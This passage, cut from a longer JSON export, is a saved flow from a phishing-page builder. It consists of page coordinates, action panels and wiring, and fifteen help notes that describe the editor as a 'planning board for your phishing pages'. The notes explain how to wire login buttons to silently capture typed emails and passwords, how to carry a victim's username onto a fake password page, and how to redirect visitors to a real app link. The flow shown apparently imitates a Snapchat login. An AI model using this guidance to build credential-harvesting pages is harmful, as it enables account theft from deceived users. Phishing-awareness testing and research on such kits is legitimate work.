 "y": 817, "w": 125.40277862548828, "h": 17}, "#footerContainer > div:nth-of-type(3) > div:nth-of-type(3) > a:nth-of-type(3)": {"x": 960, "y": 840, "w": 125.69444274902344, "h": 17}, "#footerContainer > div:nth-of-type(3) > div:nth-of-type(3) > a:nth-of-type(4)": {"x": 960, "y": 863, "w": 111.23611450195312, "h": 17}, "#footerContainer > div:nth-of-type(3) > div:nth-of-type(3) > a:nth-of-type(5)": {"x": 960, "y": 886, "w": 111.09722137451172, "h": 17}, "#footerContainer > div:nth-of-type(4) > div:nth-of-type(3) > a:nth-of-type(1)": {"x": 1227.5, "y": 794, "w": 92.11111450195312, "h": 17}, "#footerContainer > div:nth-of-type(4) > div:nth-of-type(3) > a:nth-of-type(2)": {"x": 1227.5, "y": 817, "w": 132.59722900390625, "h": 17}, "#footerContainer > div:nth-of-type(4) > div:nth-of-type(3) > a:nth-of-type(3)": {"x": 1227.5, "y": 840, "w": 86.55555725097656, "h": 17}, "#footerContainer > div:nth-of-type(4) > div:nth-of-type(3) > a:nth-of-type(4)": {"x": 1227.5, "y": 863, "w": 130.06944274902344, "h": 17}, "#footerContainer > div:nth-of-type(4) > div:nth-of-type(3) > a:nth-of-type(5)": {"x": 1227.5, "y": 886, "w": 185, "h": 17}, "#footerContainer > div:nth-of-type(4) > div:nth-of-type(3) > a:nth-of-type(6)": {"x": 1227.5, "y": 909, "w": 176.5416717529297, "h": 17}, "#footerContainer > div:nth-of-type(4) > div:nth-of-type(3) > a:nth-of-type(7)": {"x": 1227.5, "y": 932, "w": 116, "h": 17}, "#__next > div:nth-of-type(1) > main:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(2) > div:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(2) > div:nth-of-type(1) > a:nth-of-type(1)": {"x": 425, "y": 1007.7777709960938, "w": 85.69444274902344, "h": 19.55555534362793}, "#__next > div:nth-of-type(1) > main:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(2) > div:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(2) > div:nth-of-type(1) > a:nth-of-type(2)": {"x": 550.6944580078125, "y": 1007.7777709960938, "w": 105.25, "h": 19.55555534362793}, "#__next > div:nth-of-type(1) > main:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(2) > div:nth-of-type(1) > div:nth-of-type(2) > a:nth-of-type(1)": {"x": 425, "y": 1046, "w": 1070, "h": 34}}, "dfRects": {"#__next > div:nth-of-type(1) > main:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(1) > p:nth-of-type(1)": {"x": 836.9166870117188, "y": 212.38888549804688, "w": 177.2916717529297, "h": 24}}}}, {"id": "act_mu8ayzw8_23", "type": "capture", "x": 2190, "y": 1249, "width": 230, "height": 104, "data": {}}, {"id": "act_mu8az63h_26", "type": "capture", "x": 2361, "y": 1031.5, "width": 230, "height": 104, "data": {}}, {"id": "act_mu8azrqq_29", "type": "do_nothing", "x": 2191, "y": 1144, "width": 210, "height": 96, "data": {}}, {"id": "act_mu8b1gko_35", "type": "url", "x": 2194, "y": 1365, "width": 230, "height": 104, "data": {"label": "App Link", "url": "https://www.snapchat.com/download"}}, {"id": "note_exp_01", "type": "note", "x": 24, "y": 40, "width": 280, "height": 200, "data": {"label": "Start here — read me first", "notes": "This window is the Visual Editor — the planning board for your phishing pages.\n\nEvery box (called a panel) is one piece: a website page, a small action panel, or a note like this one.\n\nPanels connect LEFT to RIGHT, so visitors walk from the starting page toward the last one.\n\nRead these notes left to right, top to bottom — after that you know every button.\n\nTip: this canvas is only the plan. Nothing is live until you press Save.", "buttonStates": {}}}, {"id": "note_exp_02", "type": "note", "x": 24, "y": 290, "width": 280, "height": 200, "data": {"label": "The top bar — Save · DF · Center", "notes": "Top buttons, left to right:\n\n• Save = stores everything on the server (pages, strings, DF wires, notes). The green 'Saved' flash means it worked.\n• Dynamic Fetching (lightning) = switches into DF mode, a special editing mode explained in the DF notes below.\n• Center = slides the view back to your starting page if you scrolled away.\n• Close = leaves the editor. Save first — closing does NOT save for you.\n\nThe pen icon (top left) is just the editor logo.", "buttonStates": {}}}, {"id": "note_exp_03", "type": "note", "x": 24, "y": 540, "width": 280, "height": 200, "data": {"label": "Pages = the big boxes", "notes": "The big boxes are website pages. Inside each one your real HTML is shown, so buttons and form fields are clickable.\n\n• Drag the dark title bar to move a page around.\n• The red 'start' badge marks where visitors enter the flow (the left-most page without an incoming string).\n• In normal mode, click a button INSIDE a page to wire what it does (see the next notes).\n\nPages never build themselves — you choose what every button does.", "buttonStates": {}}}, {"id": "note_exp_04", "type": "note", "x": 24, "y": 790, "width": 280, "height": 200, "data": {"label": "New Page", "notes": "Need a second page (for example the password step)?\n\nRIGHT-click any empty canvas spot and choose 'New Page'. Pick an HTML file — or a whole folder (the page plus its CSS, JS, images and fonts) — and it becomes its own panel on the canvas.\n\nA New Page is NOT connected automatically. It sits to the right; wire it with a String (next notes) so visitors reach it.\n\nIts grey dot on the LEFT edge is where strings from buttons attach.", "buttonStates": {}}}, {"id": "note_exp_05", "type": "note", "x": 336, "y": 40, "width": 280, "height": 200, "data": {"label": "Click a button → action popup", "notes": "In NORMAL mode Dynamic Fetching\n(DF off), click any button inside a page preview. A popup lists what this button may do:\n\n• String — send visitors to a page you pick\n• New Page — build and connect a new page at once\n• Capture Details — record the typed email/password silently\n• URL — send visitors to one custom web address\n• Do Nothing — the click just stays on the page\n\nYou can combine Capture with one navigation. The padlock locks/unlocks the button (explained below).", "buttonStates": {}}}, {"id": "note_exp_06", "type": "note", "x": 336, "y": 290, "width": 280, "height": 200, "data": {"label": "String (connector)", "notes": "Strings are the violet curved lines between panels: when the visitor clicks that button, they move to the panel on its other end.\n\nHow to draw one:\n1. Click the button inside the preview\n2. Pick String in the popup\n3. A dashed violet line follows your mouse\n4. Click the LEFT grey dot of the target page\n\nDelete a string with the ✕ on its middle. Dashed line = that button is locked.", "buttonStates": {}}}, {"id": "note_exp_07", "type": "note", "x": 336, "y": 540, "width": 280, "height": 200, "data": {"label": "Capture · URL · Do Nothing", "notes": "These small panels are button targets you can create:\n\n• Capture Details (red, eye) — the submitted email/password are recorded and appear on the Reports page.\n• URL (amber) — sends the visitor to one custom link. Click the ✎ to rename it and enter the URL.\n• Do Nothing — the click is swallowed; the visitor stays on the page.\n\nThey wire the same way: click your button, choose the action, and the connection is drawn for you.\nA dashed line to any of them = locked button (no capture/navigation while locked).", "buttonStates": {}}}, {"id": "note_exp_08", "type": "note", "x": 336, "y": 790, "width": 280, "height": 200, "data": {"label": "DF (Dynamic Fetching) — the mode", "notes": "DF = Dynamic Fetching, the lightning button in the top bar. It is an editing mode and is OFF by default.\n\nTurn it ON when you want pages to SHARE values — for example show on the password page whatever the visitor typed as username on the first page.\n\nWhile DF is ON you get tools: hover highlight, red mark boxes, value strings.\nTurn it OFF to return to normal wiring — every DF tool hides itself again.", "buttonStates": {}}}, {"id": "note_exp_09", "type": "note", "x": 336, "y": 1040, "width": 280, "height": 200, "data": {"label": "DF: mark source & wire a pipe", "notes": "With DF mode ON:\n\n1. RIGHT-click an input (email / username) inside a page → 'Mark as Input field'. A red dashed box marks it as a SOURCE.\n2. A yellow connector dot appears on that input. CLICK THE DOT ONLY to throw a yellow string — clicking elsewhere does nothing.\n3. Click a text or an input on ANOTHER page to drop the string → a yellow pipe is created.\n\nAt runtime, whatever the visitor types in the source flows into the target. Delete a pipe with its ✕ (DF mode only). If the cursor leaves the canvas the pipe snaps back to its dot until you return.", "buttonStates": {}}}, {"id": "note_exp_10", "type": "note", "x": 648, "y": 40, "width": 280, "height": 200, "data": {"label": "DF: edit hardcoded text", "notes": "With DF mode ON:\n\n• DOUBLE-click any text in a page preview (or right-click it) and a small editor opens: change the default value shown there before anything is typed.\n• When an input on another page is wired to this text, the value your visitor types replaces the text at runtime.\n• Remove everything and the red box stays, so you can double-click and edit again later.\n\nRed dashed boxes with a yellow dot = marked elements. They are DF-only dev tools: hidden when DF is off.", "buttonStates": {}}}, {"id": "note_exp_11", "type": "note", "x": 648, "y": 290, "width": 280, "height": 200, "data": {"label": "DF things are locked in normal mode", "notes": "Yellow strings, red mark boxes and delete ✕ buttons belong to DF mode only.\n\nSwitch DF off and they lock themselves: strings stay visible (so you can still see the value flow), but nothing can be edited or deleted until you switch DF back on.\n\nNormal mode keeps working exactly as before: buttons, strings, panels.", "buttonStates": {}}}, {"id": "note_exp_12", "type": "note", "x": 648, "y": 540, "width": 280, "height": 200, "data": {"label": "Notes — this box itself", "notes": "Notes (like this one) live right on the canvas so anyone opening the flow can read it.\n\n• Right-click empty canvas → 'Note' to add one.\n• Pencil (title bar) renames it.\n• Type inside — text is capped at 2000 characters (counter at the top).\n• Drag the bottom-right corner to resize, same drag as page panels.\n• Notes are safe: nothing can connect to them, and they save with the flow.", "buttonStates": {}}}, {"id": "note_exp_13", "type": "note", "x": 24, "y": 1040, "width": 280, "height": 200, "data": {"label": "Moving · resizing · deleting", "notes": "Canvas housekeeping:\n\n• Move any panel: drag its title bar.\n• Resize: drag the small white corner at its bottom-right (the shape stays locked).\n• Delete: the trash icon in the title bar removes a panel AND its strings.\n• Got lost? Press Center to jump back to the starting page.\n\nEverything survives Save + reopen: strings, marks, notes and panel sizes.", "buttonStates": {}}}, {"id": "note_exp_14", "type": "note", "x": 648, "y": 790, "width": 280, "height": 200, "data": {"label": "What a visitor experiences", "notes": "Recap of the full machine, in visitor order:\n\n1. Visitor opens your starting page (the 'start' panel).\n2. They type into an input and click a button.\n3. Actions fire: capture (record credentials), navigate (String / URL), or nothing.\n4. DF pipes run first: any value the visitor typed can be shown on the next page.\n5. The walk continues panel by panel, left to right.\n\nBuild → Save → the Live Preview on the Landing Pages page shows the finished result.", "buttonStates": {}}}, {"id": "note_exp_15", "type": "note", "x": 648, "y": 1040, "width": 280, "height": 200, "data": {"label": "Everyday checklist (do this order)", "notes": "A simple recipe every time:\n\n1. Import your pages (start page + New Page for the next step).\n2. NORMAL mode: click each button in the previews and wire its action.\n3. Add Capture Details wherever submitted data matters.\n4. DF mode ON → mark the inputs, edit page texts, wire value pipes.\n5. DF OFF → quick look (all DF tools are hidden and locked).\n6. Save. Reopen and everything is exactly where you left it.", "buttonStates": {}}}], "connections": [{"id": "c_mu8asgdq_4", "sourceNodeId": "start_mu8aqdi6_1", "sourceButtonSelector": "body:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(2) > div:nth-of-type(1) > div:nth-of-type(2) > div:nth-of-type(4) > a:nth-of-type(1)", "targetNodeId": "act_mu8asgdq_2"}, {"id": "c_mu8athvc_7", "sourceNodeId": "start_mu8aqdi6_1", "sourceButtonSelector": "#forget > a:nth-of-type(1)", "targetNodeId": "act_mu8athvb_5"}, {"id": "c_mu8au8mi_10", "sourceNodeId": "start_mu8aqdi6_1", "sourceButtonSelector": "#noAccount > span:nth-of-type(1) > a:nth-of-type(1)", "targetNodeId": "act_mu8au8mi_8"}, {"id": "c_mu8auszk_13", "sourceNodeId": "start_mu8aqdi6_1", "sourceButtonSelector": "#login", "targetNodeId": "act_mu8auszj_11"}, {"id": "c_mu8av220_16", "sourceNodeId": "start_mu8aqdi6_1", "sourceButtonSelector": "#login", "targetNodeId": "act_mu8av220_14"}, {"id": "dfc_mu8axxp6_20", "type": "df", "sourceNodeId": "act_mu8av220_14", "sourceSelector": "#__next > main:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(1) > aside:nth-of-type(1) > div:nth-of-type(1) > form:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(1) > label:nth-of-type(1) > input:nth-of-type(1)", "sourceButtonSelector": "", "targetNodeId": "np_mu8axbd9_18", "targetSelector": "#__next > div:nth-of-type(1) > main:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(1) > p:nth-of-type(1)"}, {"id": "c_mu8ay3ee_22", "sourceNodeId": "act_mu8av220_14", "sourceButtonSelector": "#__next > main:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(1) > aside:nth-of-type(1) > div:nth-of-type(1) > form:nth-of-type(1) > div:nth-of-type(1) > span:nth-of-type(1) > button:nth-of-type(1)", "targetNodeId": "np_mu8axbd9_18"}, {"id": "c_mu8ayzw9_25", "sourceNodeId": "act_mu8av220_14", "sourceButtonSelector": "#__next > main:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(1) > aside:nth-of-type(1) > div:nth-of-type(1) > form:nth-of-type(1) > div:nth-of-type(1) > span:nth-of-type(1) > button:nth-of-type(1)", "targetNodeId": "act_mu8ayzw8_23"}, {"id": "c_mu8az63i_28", "sourceNodeId": "np_mu8axbd9_18", "sourceButtonSelector": "#__next > div:nth-of-type(1) > main:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(1) > form:nth-of-type(1) > div:nth-of-type(3) > button:nth-of-type(1)", "targetNodeId": "act_mu8az63h_26"}, {"id": "c_mu8azrqq_31", "sourceNodeId": "act_mu8av220_14", "sourceButtonSelector": "#__next > main:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(1) > aside:nth-of-type(1) > div:nth-of-type(1) > form:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(1) > button:nth-of-type(1)", "targetNodeId": "act_mu8azrqq_29"}, {"id": "c_mu8b1gko_37", "sourceNodeId": "act_mu8av220_14", "sourceButtonSelector": "#__next > main:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(1) > aside:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(2) > p:nth-of-type(1) > a:nth-of-type(1)", "targetNodeId": "act_mu8b1gko_35"}]}}